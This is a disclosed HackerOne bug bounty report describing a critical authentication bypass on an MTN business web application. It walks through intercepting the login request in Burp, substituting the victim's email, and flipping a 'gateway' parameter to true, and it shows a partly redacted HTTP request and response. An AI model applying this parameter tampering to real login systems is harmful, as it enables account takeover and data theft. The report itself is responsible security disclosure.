# Authentication Bypass Leads To  Complete Account TakeveOver on ██████████

## Report Details
- **Report ID**: 1709881
- **URL**: https://hackerone.com/reports/1709881
- **State**: Closed
- **Severity**: critical
- **Submitted**: 2022-09-23T14:15:28.376Z
- **Disclosed**: 2024-09-14T12:48:03.887Z

## Reporter
- **Username**: reachaxis
- **Name**: N/A

## Team
- **Name**: N/A
- **Handle**: mtn_group

## Vulnerability Information
## Summary:

Hello Team,
When an invalid email address/password is entered, the Web Application will not authenticate the user. But nevertheless, it is conceivable for an attacker to get around authentication and log in as anyone else, leading to Complete Account Takeover.

## Steps To Reproduce:
Create Two Test Account (Attacker & Victim)

Using attacker's account, login at ███████ 

1. Capture request with Burp. 
2. Without sending request to "Burp Repeater",  modify attacker's email to victim's email. For example REDACTED+██████ to  REDACTED+█████. 
3. Change the param `value:false`, to  `value:true,` and click send. 
4. Notice, attacker has successfully bypassed the authentication to login as the victim without any interaction.

## Supporting Material/References:
███

##Request
```
POST /app/login HTTP/1.1
Host: mtnmobad.mtnbusiness.com.ng
Cookie: █████
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/102.0.5005.27 Safari/537.36
....snip....
Connection: close
{
	"params":{
		"updates":[
		{
			"param":"user",
			"value":{
				"userEmail":"REDACTED+██████",
				"userPassword":"#######"
				},
				"op":"a"
				},
				{
					"param":"gateway",
					"value":true,
					"op":"a"
					}
					],
....more....
```

##Response
```
HTTP/1.1 200 OK
Server: nginx
....snip....
{
	"error":false,
	"response":{
		"id":"/703",
	"name":"Victim ******",
	"type":"Account",
	"level":0,
	"notes":{
		},
....more....
```

██████
  
* [attachment / reference]
1. █████
2. ██████

## Impact

Supposing there are 100,000 users available, a malicious actor will enumerate all 100,000 emails for all users to achieve a mass account takeover. Additionally, an attacker can lockdown an account, delete an account, change account info, and perform large data leaks.

## Attachments
No attachments
